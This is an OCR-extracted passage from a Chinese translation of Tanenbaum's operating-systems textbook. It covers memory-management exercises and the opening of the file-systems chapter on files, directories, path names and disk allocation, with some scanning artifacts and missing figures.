40.DEC PDP-1是最早的分时计算机之一，有4K 个18位字的内存。
在每个时刻它在内存中保持 一个进程。
当调度程序决定运行另一个进程时， 将内存中的进程写到一个换页磁鼓上，磁鼓的 表面有4K个18位字。
磁鼓可以从任何字开始 读写，而不是仅仅在字0。
请解释为什么要选 这样的磁鼓?
41.一台计算机为每个进程提供65536字节的地址 空间，这个地址空间被划分为多个4KB的页面。
一个特定的程序有32768字节的正文、16386字 节的数据和15870字节的堆栈。
这个程序能装 入这个机器的地址空间吗?
如果页面大小是 512字节，能放得下吗?
记住， 一个页面不能 同时包含两个或者更多的不同种类段，例如， 一页里不能同时有代码段和数据段。
43.Frugal 计算机公司有一组操作系统设计人员， 他们正在考虑一种方法，以在新操作系统中减 少对后备存储数量的需求。
老板建议根本不要 把程序正文保存在交换区中，而是在需要的时 候直接从二进制文件中调页进来。
在什么条件 下(如果有这样的条件话),这种想法适用于 程序文本?
在什么条件下(如果有这样的条件
话),这种想法适用于数据?
44.有一条机器语言指令将要被调入，该指令可把 一个32位字装入含有32位字地址的寄存器。
这 个指令可能引起的最大缺页中断次数是多少?
45.解释内部分段和外部分段的区别。
分页系统用 的是哪一种?
纯分段的系统用的又是哪一种?
46. 在MULTICS 中，当同时使用分段和分页时， 首先必须查找段描述符，然后是页描述符。
TLB也是这样按两级查找的方式工作吗?
47.一个程序中有两个段，段0中为指令，段1中为 读/写数据。
段0有读/执行保护，段1有读/写保 护。
内存是按需分页式虚拟内存系统，它的虚 拟地址为4位页号，10位偏移量。
页表和保护 如下所示(表中的数字均为十进制):
对于下面的每种情形，给出动态地址所对应的 实(实际)内存地址，或者指出发生了哪种失 效(缺页中断或保护错误)。
(a) 读取页：段1,页1,偏移3;
(b) 存储页：段0,页0,偏移16;
(c) 读取页：段1,页4,偏移28;
(d) 跳转到：段1,页3,偏移32。
48.你能想象在哪些情况下支持虚拟内存是个坏想 法吗?
不支持虚拟内存能得到什么好处呢?
请 解释。
49.虚拟内存提供了进程隔离机制。
如果允许两个 操作系统同时运行，在内存管理上会有什么麻 烦?
如何解决这些困难?
50.构造一个直方图，计算你的计算机中可执行二 进制文件大小的平均值和中间值。
在Windows 系统中，观察所有的.exe和 .dll文件；在Unix系 统中，观察/bin 、/usr/bin 、/local/bin 目录下的 所有非脚本文件的可执行文件(或者使用file 工具来查找所有的可执行文件)。
确定这台机 器的最优页面大小，只考虑代码(不包括数据)。
考虑内部碎片和页表大小，对页表项的大小做
出合理的假设。
假设所有的程序被执行的可能 性相同，所以可以同等对待。
51.编写一个程序，它使用老化算法模拟一个分页 系统。
页框的数量是一个参数。
页面访问序列 从文件中读取。
对于一个给定的输入文件，列 出每1000个内存访问中发生缺页中断的数目， 它是可用页框数的函数。
52.编写一个程序，模拟一个使用工作集时间算法 的“玩具”分页系统。
我们称之为“玩具”, 是因为我们假设没有写访问(而这与真实系统 大相径庭),进程的终至和创建也被忽略(生 命周期为永恒)。
输入为：
●回收寿命阈值
●时钟周期间隔，用内存访问次数表述
·一个有页面访问序列的文件
(a) 描述你实现的基本数据结构和算法。
(b) 运行该程序，并解释运行结果与你的预期 有何出入。
(c) 构造每1000次内存访问中缺页的数目和工 作集大小。
(d) 如果要处理包含写操作的内存访问流，需 要如何扩展该程序?
53. 编写一个程序，说明TLB 未命中对有效内存访 问时间的影响，内存访问时间可以通过计算每 次遍历大数组时的读取时间来衡量。
(a) 解释编程思想，并描述所期望输出如何展 示一些实际的虚拟内存体系结构。
(b) 运行该程序，并解释运行结果与你的预期 有何出入。
(c) 在一台更古老的且有着不同体系结构的计 算机上重复b, 并解释输出上的主要区别。
54.编写一个程序，该程序能说明在有两个进程的 简单情况下，使用局部页置换策略和全局页置 换策略的差异。
你将会用到能生成一个基于统 计模型的页面访问串的例程。
这个模型有N个 状态，状态编号从0到N-1, 代表每个可能的 页面访问，每个状态i 相关的概率p代表下一次 访问仍指向同一页面的概率。
否则，下次将以 等概率访问其他任何一个页面。
(a) 证明当N比较小时，页面访问串生成例程能 运行正常。
(b) 对有进程和页框数量固定的情况计算缺页 率。
解释这种行为为什么是正确的。
(c) 对有独立页面访问序列的两个进程，以及b 中两倍的页框数，重复b实验。
(d) 用全局策略替换局部策略重复c 。
类似地，
使用局部策略方法比较每个进程缺页率。
●可用的TLB表项数目。
· 时钟周期间隔，用内存访问次数表述。
· 一 个包含(进程，内存访问)序列的 文件 。
●更新一个TLB表项的开销。
(a) 描述你的实现中的基本数据结构和算法。
(b)运行该程序，并解释运行结果与你的预期 有何出入。
(c) 标绘每1000次访问中TLB更新的次数。
第4章
Modern Operating Systems,Fourth Edition
文 件 系 统
所有的计算机应用程序都需要存储和检索信息。
进程运行时，可以在它自己的地址空间存储一定量 的信息，但存储容量受虚拟地址空间大小的限制。
对于某些应用程序，它自己的地址空间已经足够用 了；但是对于其他一些应用程序，例如航空订票系统、银行系统或者公司记账系统，这些存储空间又显 得太小了。
在进程的地址空间上保存信息的第二个问题是：进程终止时，它保存的信息也随之丢失。
对于很多 应用(如数据库)而言，有关信息必须能保存几星期、几个月，甚至永久保留。
在使用信息的进程终止 时，这些信息是不可以消失的，甚至，即使是系统崩溃致使进程消亡了，这些信息也应该保存下来。
第三个问题是：经常需要多个进程同时访问同一信息(或者其中部分信息)。
如果有一个在线电话 簿，这个电话簿仅在一个进程的地址空间内保存，那么只有该进程才可以对它进行访问，也就是说一次 只能查找一个电话号码。
解决这个问题的方法是使信息本身独立于任何一个进程。
因此，长期存储信息有三个基本要求：
1)能够存储大量信息。
2)使用信息的进程终止时，信息仍旧存在。
3)必须能使多个进程并发访问有关信息。
磁 盘 (magnetic disk) 由于其长期存储的性质，已经有多年的使用历史。
近些年，固态硬盘逐渐流 行起来，因为它不仅没有易损坏的移动部件，而且可以提供快速的随机访问。
相比而言，虽然磁带和光 盘也被广泛使用，但是它们的性能相对较差，通常应用于备份。
在第5章会学习更多有关磁盘的知识， 目前可以先把磁盘当作一种大小固定的块的线性序列，并且支持如下两种操作：
1)读块k;
2)写块k。
事实上磁盘支持更多的操作，但只要有了这两种操作，原则上就可以解决长期存储的问题。
1)如何找到信息?
2)如何防止一个用户读取另一个用户的数据?
3)如何知道哪些块是空闲的?
就像操作系统提取处理器的概念来建立进程的抽象，以及提取物理存储器的概念来建立进程(虚拟) 地址空间的抽象那样，我们可以用一个新的抽象——文件来解决这个问题。
进程(与线程)、地址空间 和文件，这些抽象概念均是操作系统中最重要的概念。
如果真正深入理解了这三个概念，那么读者就迈 上了成为一个操作系统专家的道路。
文件是进程创建的信息逻辑单元。
一个磁盘一般含有几千甚至几百万个文件，每个文件是独立于其 他文件的，唯一不同的是文件是对磁盘的建模，而非对RAM 的建模。
事实上，如果能把每个文件看成 一个地址空间，那么读者就能理解文件的本质了。
文件是受操作系统管理的。
有关文件的构造、命名、访问、使用、保护、实现和管理方法都是操作系统 设计的主要内容。
从总体上看，操作系统中处理文件的部分称为文件系统 (file system),这就是本章的论题。
从用户角度来看，文件系统中最重要的是它在用户眼中的表现形式，也就是文件是由什么组成的， 怎样给文件命名，怎样保护文件，以及可以对文件进行哪些操作等。
至于用链表还是用位图来记录空闲
存储区以及在一个逻辑磁盘块中有多少个扇区等细节并不是用户所关心的，当然对文件系统的设计者来 说这些内容是相当重要的。
正因为如此，本章将分为几节讲述，前两节分别介绍文件和目录的用户接 口，随后详细讨论文件系统的实现，最后介绍一些文件系统的实例。
4.1 文件
在本节中，我们从用户角度来考察文件，即用户如何使用文件?
文件具有哪些特性?
4.1.1 文件命名
文件是一种抽象机制，它提供了一种在磁盘上保存信息而且方便以后读取的方法。
这种方法可以使 用户不必了解存储信息的方法、位置和实际磁盘工作方式等有关细节。
也许任何一种抽象机制的最重要的特性就是对管理对象的命名方式，所以，我们将从对文件的命名 开始考察文件系统。
在进程创建文件时，它给文件命名。
在进程终止时，该文件仍旧存在，并且其他进 程可以通过这个文件名对它进行访问。
文件的具体命名规则在各个系统中是不同的，不过所有的现代操作系统都允许用1至8个字母组成的 字符串作为合法的文件名。
因此，andrea 、bruce和cathy都是合法文件名。
通常，文件名中也允许有数字 和一些特殊字符，所以像2、urgent!
和Fig.2-14也是合法的。
许多文件系统支持长达255个字符的文件名。
有些文件系统区分大小写字母，有些则不区分。
UNIX 属于前一类，老的文件系统MS-DOS则属于 后一类。
(顺便提一下，尽管MS-DOS 很古老了，但它仍然非常广泛地应用于嵌入式系统，所以MS-DOS 绝对没有过时。
)所以，在UNIX系统中maria 、Maria和MARIA是三个不同的文件，而在MS-DOS中，它 们是同一个文件。
关于文件系统在这里需要插一句，Windows 95和Windows 98用的都是MS-DOS的文件系统，即 FAT-16, 因此继承了其很多特性，例如有关文件名的构造方法。
Windows 98对FAT-16进行了一些扩展， 从而成为FAT-32, 但这两者是很相似的。
另外，虽然FAT已经过时，但Windows NT 、Windows 2000、 Windows XP 、Windows Vista 、Windows 7和Windows 8依然支持该文件系统。
然而，较新版本的操作系
图4-1 一些典型的文件扩展名
微软唯一能满足OS X读写操作的文件系统。
许多操作系统支持文件名用圆点隔开分为两部分，如文件名prog.c 。
圆点后面的部分称为文件扩展 名 (file extension),文件扩展名通常表示文件的一些信息，如MS-DOS中，文件名由1至8个字符以及1 至3个字符的可选扩展名组成。
在UNIX里，如果有扩展名，则扩展名长度完全由用户决定，一个文件甚 至可以包含两个或更多的扩展名。
如homepage.html.zip, 这里.html 表明HTML格式的一个Web页面，.zip 表示该文件 (homepage.html) 已经采用zip程序压缩过。
一些常用文件扩展名及其含义如图4-1所示。
在某些系统中(如所有UNIX版本),文件扩展名只是一种约定，操作系统并不强迫采用它。
名为
file.txt的文件也许是文本文件，这个文件名更多的是提醒所有者，而不是表示传送什么信息给计算机。
但是 另一方面，C 编译器可能要求它编译的文件以.c 结尾，否则它会拒绝编译。
然而，操作系统不关心这一点。
对于可以处理多种类型文件的某个程序，这类约定是特别有用的。
例如，C 编译器可以编译、链接 多种文件，包括C 文件和汇编语言文件。
这时扩展名就很有必要，编译器利用它区分哪些是C 文件，哪 些是汇编文件，哪些是其他文件。
与UNIX相 反 ，Windows 关注扩展名且对其赋予了含义。
用户(或进程)可以在操作系统中注册扩展 名，并且规定哪个程序“拥有”该扩展名。
当用户双击某个文件名时，“拥有”该文件扩展名的程序就启 动并运行该文件。
例如，双击file.docx 启动了Microsoft Word程序，并以file.docx 作为待编辑的初始文件。
4.1.2 文件结构
文件可以有多种构造方式，在图4-2中列出了常用的三种方式。
图4-2a中的文件是一种无结构的字 节序列，事实上操作系统不知道也不关心文件内容是什么,操作系统所见到的就是字节，其文件内容的 任何含义只在用户程序中解释。
UNIX 和Windows 都采用这种方法。
图4-2 三种文件结构：a)字节序列；b)记录序列；c)树
第三种文件结构如图4-2c所示。
文件在这种结构中由一棵记录树构成，每个记录不必具有相同的长度， 记录的固定位置上有一个键字段。
这棵树按“键”字段进行排序，从而可以对特定“键”进行快速查找。
4.1.3 文件类型
很多操作系统支持多种文件类型。
如UNIX (当然，包括OS X) 和Windows 中都有普通文件和目录，
UNIX还有字符特殊文件 (character special file) 和块特殊文件 (block special file)。
普通文件(regular file) 是包含有用户信息的文件。
图4-2中的所有文件都是普通文件。
目 录 (directory) 是管理文件系统 结构的系统文件，将在以后的章节中讨论。
字符特殊文件和输入/输出有关，用于串行I/O类设备，如终 端、打印机、网络等。
块特殊文件用于磁盘类设备。
本章主要讨论普通文件。
普通文件一般分为ASCII 文件和二进制文件。
ASCII 文件由多行正文组成。
在某些系统中，每行用 回车符结束，其他系统则用换行符结束。
有些系统还同时采用回车符和换行符(如MS-DOS) 。
文件中 各行的长度不一定相同。
ASCII文件的最大优势是可以显示和打印，还可以用任何文本编辑器进行编辑。
再者，如果很多程序 都以ASCII文件作为输入和输出，就很容易把一个程序的输出作为另一个程序的输入，如shell管道一样。
(用管道实现进程间通信并非更容易，但若以一种公认的标准(如ASCII码)来表示，则更易于信息翻译。
)
其他与ASCII 文件不同的是二进制文件。
打印出来的二进制文件是无法理解的、充满混乱字符的一 张表。
通常，二进制文件有一定的内部结构，使用该文件的程序才了解这种结构。
如图4-3a是一个简单的可执行二进制文件，它取自某个早期版本的UNIX。
尽管这个文件只是一个字 节序列，但只有文件的格式正确时，操作系统才会执行这个文件。
这个文件有五个段：文件头、正文、 数据、重定位位及符号表。
文件头以所谓的魔数 (magic number) 开始，表明该文件是一个可执行的文 件(防止非这种格式的文件偶然运行)。
魔数后面是文件中各段的长度、执行的起始地址和一些标志位。
程序本身的正文和数据在文件头后面。
这些被装入内存，并使用重定位位重新定位。
符号表则用于调试。
魔数
正文长度
数据长度
BSS长度
符号表长度
入口点
标 志
正文
数据
重定位位
符号表
a)
b)
图4-3 a) 一个可执行文件；b) 一个存档文件
二进制文件的第二个例子是UNIX的存档文件，它由已编译但没有链接的库过程(模块)组合而成。
每个文件以模块头开始，其中记录了名称、创建日期、所有者、保护码和文件大小。
该模块头与可执行 文件一样，也都是二进制数字，打印输出它们毫无意义。
所有操作系统必须至少能够识别它们自己的可执行文件的文件类型，其中有些操作系统还可识别更 多的文件类型。
一种老式的TOPS-20 操作系统(用于DECsystem20 计算机)甚至可检查可执行文件的创 建时间，然后，它可以找到相应的源文件，看它在二进制文件生成后是否被修改过。
如果修改过，操作
系统自动重新编译这个文件。
在UNIX中，就是在shell 中嵌入make 程序。
这时操作系统要求用户必须采 用固定的文件扩展名，从而确定哪个源程序生成哪个二进制文件。
如果用户执行了系统设计者没有考虑到的某种操作，这种强制类型的文件有可能会引起麻烦。
比如 在一个系统中，程序输出文件的扩展名是.dat (数据文件),若用户写一个格式化程序，读入.c(C 程序) 文件并转换它(比如把该文件转换成标准的首行缩进),再把转换后的文件以.dat类型输出。
如果用户试 图用C编译器来编译这个文件，因为文件扩展名不对，C 编译器会拒绝编译。
若想把file.dat 复制到file.c 也不行，因为系统会认为这是无效的复制(防止用户错误)。
尽管对初学者而言，这类“保护”是有利的，但一些有经验的用户却感到很烦恼，因为他们要花很 多精力来适应操作系统对合理和不合理操作的划分。
4.1.4 文件访问
早期操作系统只有一种文件访问方式：顺序访问 (sequential access)。
进程在这些系统中可从头按顺 序读取文件的全部字节或记录，但不能跳过某一些内容，也不能不按顺序读取。
顺序访问文件是可以返 回到起点的，需要时可多次读取该文件。
在存储介质是磁带而不是磁盘时，顺序访问文件是很方便的。
当用磁盘来存储文件时，可以不按顺序地读取文件中的字节或记录，或者按照关键字而不是位置来 访问记录。
这种能够以任何次序读取其中字节或记录的文件称作随机访问文件(random access file)。
许 多应用程序需要这种类型的文件。
有两种方法可以指示从何处开始读取文件。
一种是每次read 操作都给出开始读文件的位置。
另一种 是用一个特殊的seek 操作设置当前位置，在seek 操作后，从这个当前位置顺序地开始读文件。
UNIX 和
Windows 使用的是后一种方法。
4.1.5 文件属性
前4个属性与文件保护相关，它 们指出了谁可以访问这个文件，谁 不能访问这个文件。
有各种不同的 文件保护方案，以后会讨论其中一 些保护方案。
在一些系统中，用户 必须给出口令才能访问文件。
此时， 口令也必须是文件属性之一。
标志是一些位或短字段，用于
图4-4 一些常用的文件属性
控制或启用某些特殊属性。
例如，隐藏文件位表示该文件不在文件列表中出现。
存档标志位用于记录文 件是否备份过，由备份程序清除该标志位；若文件被修改，操作系统则设置该标志位。
用这种方法，备 份程序可以知道哪些文件需要备份。
临时标志表明当创建该文件的进程终止时，文件会被自动删除。
记录长度、键的位置和键的长度等字段只能出现在用关键字查找记录的文件里，它们提供了查找关 键字所需的信息。
不同的时间字段记录了文件的创建时间、最近一次访问时间以及最后一次修改时间，它们的作用不
同。
例如，目标文件生成后被修改的源文件需要重新编译生成目标文件。
这些字段提供了必要的信息。
当前大小字段指出了当前的文件大小。
在一些老式大型机操作系统中创建文件时，要给出文件的最 大长度，以便操作系统事先按最大长度留出存储空间。
工作站和个人计算机中的操作系统则聪明多了， 不需要这一点提示。
4.1.6 文件操作
使用文件的目的是存储信息并方便以后的检索。
对于存储和检索，不同系统提供了不同的操作。
以 下是与文件有关的最常用的一些系统调用：
1)create 。
创建不包含任何数据的文件。
该调用的目的是表明文件即将建立，并设置文件的一些属性。
2)delete 。
当不再需要某个文件时，必须删除该文件以释放磁盘空间。
任何文件系统总有一个系统 调用用来删除文件。
3)open 。
在使用文件之前，必须先打开文件。
open 调用的目的是：把文件属性和磁盘地址表装入 内存，便于后续调用的快速访问。
4)close 。
访问结束后，不再需要文件属性和磁盘地址，这时应该关闭文件以释放内部表空间。
很 多系统限制进程打开文件的个数，以鼓励用户关闭不再使用的文件。
磁盘以块为单位写入，关闭文件时， 写入该文件的最后一块，即使这个块还没有满。
5)read 。
在文件中读取数据。
一般地，读取的数据来自文件的当前位置。
调用者必须指明需要读 取多少数据，并且提供存放这些数据的缓冲区。
8)seek 。
对于随机访问文件，要指定从何处开始获取数据，通常的方法是用seek 系统调用把当前 位置指针指向文件中特定位置。
seek 调用结束后，就可以从该位置开始读写数据了。
9)get attributes。
进程运行常需要读取文件属性。
例如，UNIX中make程序通常用于管理由多个源 文件组成的软件开发项目。
在调用make时，它会检查全部源文件和目标文件的修改时间，实现最小编译， 使得全部文件都为最新版本。
为达到此目的，需要查找文件的某一些属性，即修改时间。
10)set attributes。
某些属性是可由用户设置的，甚至是在文件创建之后，实现该功能的是set attributes 系统调用。
保护模式信息是一个典型的例子，大多数标志也属于此类属性。
11)rename 。
用户常常要改变已有文件的名字，rename 系统调用用于这一目的。
严格地说，rename 系统调用不是必需的，因为先把文件复制到一个新文件中，然后删除原来的文件，就可以达到同样的目的。
4.1.7 使用文件系统调用的一个示例程序
本节会考察一个简单的UNIX 程序，它把文件从源文件处复制到目标文件处。
程序清单如图4-5所示。
该 程序的功能很简单，甚至没有考虑出错报告处理，但它给出了有关文件的系统调用是怎样工作的一般思路。
例如，通过下面的命令行可以调用程序copyfile:
copyfile abc xyz
把文件abc复制到xyz。
如果xyz已经存在，abc 会覆盖它。
否则，就创建它。
程序调用必须提供两个参数， 它们都是合法的文件名。
第一个是输入文件；第二个是输出文件。
在程序的开头是四个#include 语句，它们把大量的定义和函数原型包含在这个程序。
为了使程序遵 守相应的国际标准，这些是需要的，无须作进一步的讨论。
接下来一行是main函数的原型，这是ANSI C所必需的，但对我们的目的而言，它也不是重点。
接下来的第一个#define语句是一个宏定义，它把BUF_SIZE字符串定义为一个宏，其数值为4096。
程 序会读写若干个有4096个字节的块。
类似地，给常数一个名称而且用这一名称代替常数是一种良好的编程 习惯。
这样的习惯不仅使程序易读，而且使程序易于维护。
第二个#define 语句决定谁可以访问输出文件。
主程序名为main, 它有两个参数：argc 和argv。
当调用这个程序时，操作系统提供这两个参数。
第 一个参数表示在调用该程序的命令行中包含多少个字符串，包括该程序名。
它应该是3。
第二个参数是 指向程序参数的指针数组。
在上面的示例程序中，这一数组的元素应该包含指向下列值的指针：
argv[0]="copyfile"
argv[1]="abc"
argv[2]="xyz"
正是通过这个数组，程序访问其参数。
声明了五个变量。
前面两个 (in_fd 和out_fd) 用来保存文件描述符，即打开一个文件时返回的一个 小整数。
后面两个(rd_count 和wt_count) 分别是由read 和write 系统调用所返回的字节计数。
最后一个 (buffer) 是用于保存读出的数据以及提供写入数据的缓冲区。
第一行实际语句检查argc, 看它是否是3。
如果不是，它以状态码1退出。
任何非0的状态码均表示 出错。
在本程序中，状态码是唯一的出错报告处理。
一个程序的产品版通常会打印出错信息。
图4-5 复制文件的一个简单程序
接着我们试图打开源文件并创建目标文件。
如果源文件成功打开，系统会给in_fd 赋予一个小的整 数，用以标识源文件。
后续的调用必须引用这个整数，使系统知道需要的是哪一个文件。
类似地，如果 目标文件也成功地创建了，out_fd 会被赋予一个标识用的值。
create的第二个变量是设置保护模式。
如果 打开或创建文件失败，对应的文件描述符被设为-1,程序带着错误码退出。
接下来是用来复制文件的循环。
一开始试图读出4KB 数据到 buffer 中。
它通过调用库过程 read来 完成这项工作，该过程实际激活了read 系统调用。
第一个参数标识文件，第二个参数指定缓冲区，第三 个参数指定读出多少字节。
赋予rd_count的字节数是实际所读出的字节数。
通常这个数是4096,除非剩
154 第 4 章
余字节数比这个数少。
当到达文件尾部时，该参数的值是0。
如果rd_count是零或负数，复制工作就不能 再进行下去，所以执行break 语句，用以中断循环(否则就无法结束了)。
调 用write 把缓冲区的内容输出到目标文件中去。
同read 类似，第一个参数标识文件，第二个参数指 定缓冲区，第三个参数指定写入多少字节。
注意字节计数是实际读出的字节数，不是BUF_SIZE 。
这 一 点是很重要的，因为最后一个缓冲区中的数据大小一般不会是4096,除非文件长度碰巧是4KB的倍数。
当整个文件处理完时，超出文件尾部的首次调用会把O值返回给rd_count, 这样，程序会退出循环。
此时，关闭两个文件，程序退出并附有正常完成的状态码。
尽管Windows 的系统调用与UNIX 的系统调用不同，但是Windows 程序复制文件的命令行的一般结 构与图4-5中的相当类似。
我们将在第11章中考察Windows 8的系统调用。
4.2 目录
文件系统通常提供目录或文件夹用于记录文件的位置，在很多系统中目录本身也是文件。
本节讨论
目录、目录的组成、目录的特性和可以对目录进行的操作。
4.2.1 一级目录系统
目录系统的最简单形式是在一个目录中包含所有的文件。
这有时称为根目录，但是由于只有一个目 录，所以其名称并不重要。
在早期的个人计算机中，这种系统很普遍，部分原因是因为只有一个用户。
有趣的是，世界第一台超级计算机CDC 6600对于所有的文件也只有一个目录，尽管该机器同时被许多
用户使用。
这样决策毫无疑问是为了简化软件设计。
一个单层目录系统的例子如图4-6所示。
该目 录中有四个文件。
这一设计的优点在于简单，并 且能够快速定位文件——事实上只有一个地方要 查看。
这种目录系统经常用于简单的嵌入式装置 中，诸如电话、数码相机以及一些便携式音乐播 放器等。
图4-6 含有四个文件的单层目录系统
4.2.2 层次目录系统
对于简单的特殊应用而言，单层目录是合适的(单层目录甚至用在了第一代个人计算机中),但是现
根目录
用户目录
C
A B ⑧ B
⑥ C
用户子目录
图4-7 层次目录系统
◎
C
用户 文件
器，如许多公司的网络系统，每个用户可以为自己的目录树拥有自己的私人根目录。
这种方式如图4-7所示， 其中，根目录含有目录A、B 和C, 分别属于不同用户，其中有两个用户为他们的项目创建了子目录。
用户可以创建任意数量的子目录，这为用户组织其工作提供了强大的结构化工具。
因此，几乎所有 现代文件系统都是用这个方式组织的。
4.2.3 路径名
用目录树组织文件系统时，需要有某种方法指明文件名。
常用的方法有两种。
第一种是，每个文件 都赋予 一 个绝对路径名 (absolute path name),它由从根目录到文件的路径组成。
例如，路径
/usr/ast/mailbox表示根目录中有子目录usr, 而 usr中又有子目录ast, 文 件mailbox 就在子目录ast下。
绝对 路径名一定从根目录开始，且是唯一的。
在UNIX中，路径各部分之间用“/”分隔。
在Windows中，分 隔符是“\”。
在MULTICS 中是“>”。
这样在这三个系统中同样的路径名按如下形式写成：
Windows lusrlast\mailbox
UNIX lusr/ast/mailbox
MULTICS >usr>ast>mailbox
不管采用哪种分隔符，如果路径名的第一个字符是分隔符，则这个路径就是绝对路径。
另一种指定文件名的方法是使用相对路径名 (relative path name)。
它 常 和工作目录 (working directory)(也称作当前目录 (current directory))一起使用。
用户可以指定一个目录作为当前工作目录。
这时，所有的不从根目录开始的路径名都是相对于工作目录的。
例如，如果当前的工作目录是/usr/ast, 则绝对路径名为/usr/ast/mailbox 的文件可以直接用mailbox 来引用。
也就是说，如果工作目录是/usr/ast, 则UNIX命令
cp lusr/ast/mailbox lusr/ast/mailbox.bak 和命令
cp mailbox mailbox.bak
具有相同的含义。
相对路径往往更方便，而它实现的功能和绝对路径完全相同。
一些程序需要访问某个特定文件，而不考虑当前目录是什么。
这时，应该采用绝对路径名。
比如， 一个检查拼写的程序在其工作时读文件/usr/lib/dictionary, 因为它可能事先不知道当前目录，所以就采 用完整的绝对路径名。
不论当前的工作目录是什么,绝对路径名总能正常工作。
当然，若这个检查拼写的程序要从目录/usr/lib中读很多文件，可以用另一种方法，即执行一个系统 调用把该程序的工作目录切换到/usr/lib, 然后只需用dictionary 作为open 的第一个参数。
通过显式地改 变工作目录，可以知道该程序在目录树中的确切位置，进而可以采用相对路径名。
每个进程都有自己的工作目录，这样在进程改变工作目录并退出后，其他进程不会受到影响，文件 系统中也不会有改变的痕迹。
对进程而言，切换工作目录是安全的，所以只要需要，就可以改变当前工 作目录。
但是，如果改变了库过程的工作目录，并且工作完毕之后没有修改回去，则其他程序有可能无 法正常运行，因为它们关于当前目录的假设已经失效。
所以库过程很少改变工作目录，若非改不可，必 定要在返回之前改回到原有的工作目录。
支持层次目录结构的大多数操作系统在每个目录中有两个特殊的目录项“.”和“..”,常读作“dot” 和“dotdot”。
dot指当前目录，dotdot指其父目录(在根目录中例外，在根目录中它指向自己)。
要了解 怎样使用它们，请考虑图4-8中的UNIX目录树。
一个进程的工作目录是/usr/ast, 它可采用“..”沿树向 上。
例如，可用命令
cp ./lib/dictionary.
把文件usr/lib/dictionary 复制到自己的目录下。
第一个路径告诉系统上溯(到usr 目录),然后向下到lib目 录，找到dictionary 文件。
第二个参数(.)指定当前目录。
当cp命令用目录名(包括“.”)作为最后一个参数时，则把全部的 文件复制到该目录中。
当然，对于上述复制，键入
cp /usr/lib/dictionary.
是更常用的方法。
用户这里采用“. ”可以避免键入两次dictionary 。
无论如何，键入 cp /usr/lib/dictionary dictionary
也可正常工作，就像键入
cp /usr/lib/dictionary lusr/ast/dictionary 一样。
所有这些命令都完成同样的工作。
图4-8 UNIX 目录树
4.2.4 目录操作
不同系统中管理目录的系统调用的差别比管理文件的系统调用的差别大。
为了了解这些系统调用有 哪些及它们怎样工作，下面给出一个例子(取自UNIX)。
1)create 。
创建目录。
除了目录项“.”和“..”外，目录内容为空。
目录项“.”和“.”是系统自 动放在目录中的(有时通过mkdir程序完成)。
2)delete。
删除目录。
只有空目录可删除。
只包含目录项“.”和“..”的目录被认为是空目录，这 两个目录项通常不能删除。
3)opendir。
目录内容可被读取。
例如，为列出目录中全部文件，程序必须先打开该目录，然后读 其中全部文件的文件名。
与打开和读文件相同，在读目录前，必须打开目录。
4)closedir。
读目录结束后，应关闭目录以释放内部表空间。
5)readdir。
系统调用readdir返回打开目录的下一个目录项。
以前也采用read 系统调用来读目录， 但这方法有一个缺点：程序员必须了解和处理目录的内部结构。
相反，不论采用哪一种目录结构， readdir 总是以标准格式返回一个目录项。
6)rename 。
在很多方面目录和文件都相似。
文件可换名，目录也可以。
8)unlink 。
删除目录项。
如果被解除连接的文件只出现在一个目录中(通常情况),则将它从文件 系统中删除。
如果它出现在多个目录中，则只删除指定路径名的连接，依然保留其他路径名的连接。
在 UNIX中，用于删除文件的系统调用(前面已有论述)实际上就是unlink。
最主要的系统调用已在上面列出，但还有其他一些调用，如与目录相关的管理保护信息的系统调用。
关于链接文件的一种不同想法是符号链接。
不同于使用两个文件名指向同一个内部数据结构来代表一 个文件，在符号链接中，一个文件名指向命名另一个文件的一个小文件。
当使用这个小文件时，例如打开 文件，文件系统沿着路径最终找到文件名，再用新名字启动查找文件的过程。
符号链接的优点在于它能够 跨越磁盘的界限，甚至可以命名在远程计算机上的文件，不过符号链接的实现并不如硬链接那样有效率。
4.3 文件系统的实现
现在从用户角度转到实现者角度来考察文件系统。
用户关心的是文件是怎样命名的、可以进行哪些 操作、目录树是什么样的以及类似的表面问题。
而实现者感兴趣的是文件和目录是怎样存储的、磁盘空 间是怎样管理的以及怎样使系统有效而可靠地工作等。
在下面几节中，我们会考察这些文件系统的实现 中出现的问题，并讨论怎样解决这些问题。
4.3.1 文件系统布局
文件系统存放在磁盘上。
多数磁盘划分为一个或多个分区，每个分区中有一个独立的文件系统。
磁 盘的0号扇区称为主引导记录 (Master Boot Record,MBR),用来引导计算机。
在MBR的结尾是分区表。
该表给出了每个分区的起始和结束地址。
表中的一个分区被标记为活动分区。
在计算机被引导时， BIOS读入并执行MBR 。
MBR 做的第一件事是确定活动分区，读入它的第一个块，称为引导块 (boot block),并执行之。
引导块中的程序将装载该分区中的操作系统。
为统一起见，每个分区都从一个引导 块开始，即使它不含有一个可启动的操作系统。
不过，未来这个分区也许会有一个操作系统的。
除了从引导块开始之外，磁盘分区的布局是随着文件系统的不同而变化的。
文件系统经常包含有如 图4-9所列的一些项目。
第一个是超级块 (superblock), 超级块包含文件系统的所有关键参数，在计算 机启动时，或者在该文件系统首次使用时，超级块会被读入内存。
超级块中的典型信息包括：确定文件 系统类型用的魔数、文件系统中块的数量以及其他重要的管理信息。
整个磁盘
分区表 磁盘分区
MBR
图4-9 一个可能的文件系统布局
接着是文件系统中空闲块的信息，例如，可以用位图或指针列表的形式给出。
后面也许跟随的是一 组i节点，这是一个数据结构数组，每个文件一个，i 节点说明了文件的方方面面。
接着可能是根目录， 它存放文件系统目录树的根部。
最后，磁盘的其他部分存放了其他所有的目录和文件。
4.3.2 文件的实现
文件存储实现的关键问题是记录各个文件分别用到哪些磁盘块。
不同操作系统采用不同的方法。
这 一节，我们讨论其中的一些方法。
1.连续分配
最简单的分配方案是把每个文件作为一连串连续数据块存储在磁盘上。
所以，在块大小为1KB的磁 盘上，50KB的文件要分配50个连续的块。
对于块大小为2KB的磁盘，将分配25个连续的块。
在图4-10a中是一个连续分配的例子。
这里列出了头40块，从左面从0块开始。
初始状态下，磁盘是 空的。
接着，从磁盘开始处(块0)开始写入长度为4块的文件A。
紧接着，在文件A的结尾开始写入一 个3块的文件B。
其次，读操作性能较好，因为在单个操作中就可以从磁盘上读出整个文件。
只需要一次寻找(对第 一个块)。
之后不再需要寻道和旋转延迟，所以，数据以磁盘全带宽的速率输入。
可见连续分配实现简 单且具有高的性能。
文件A
(12块)
文件B
(3块)
文件D (5块)
a)
文件F
(6块)
b)
图4-10 a)为7个文件连续分配空间；b)删除文件D 和F后磁盘的状态
但是，连续分配方案也同样有相当明显的不足之处：随着时间的推移，磁盘会变得零碎。
